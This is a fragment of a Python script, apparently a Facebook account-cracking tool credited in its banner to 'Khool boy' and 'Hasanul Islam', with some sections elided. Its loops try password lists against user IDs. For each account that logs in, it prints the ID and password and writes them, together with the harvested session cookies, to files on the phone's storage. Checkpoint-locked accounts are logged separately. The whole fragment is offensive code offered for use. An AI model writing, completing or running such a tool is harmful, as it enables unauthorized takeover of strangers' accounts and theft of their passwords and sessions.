...
{g}\n{h} MAKE BY  {I}{a} Khool boy
{h} FACEBOOK {I}{a} Hasanul Islam
{h} TOOLS    {I}\x1b[0m FILExRANDOM\n{g}""")
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           print(f"\r\r{a}↳{w}[{a}HASANUL💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/HASANUL-M1-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/HASANUL-M1-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
        ...
        try:
             for pak in pasx:
                    ...
                    if 'session_key' in po:
                           ...
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{a}↳{w}[{a}HASANUL-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/HASANUL-M2-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/HASANUL-M2-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
...
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{a}↳{w}[{a}KHOOl-bby{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\r{a}↳{w}[{a}HASANUL-💙{w}] {a}{uid} {I} {ps}")
                            ...
                            #print(f"\r\r\033[1;90m ↳[HASANUL-CP] {uid} ━➤ {ps}")
                            cps.append(uid)
                            break
                    else:
                            continue
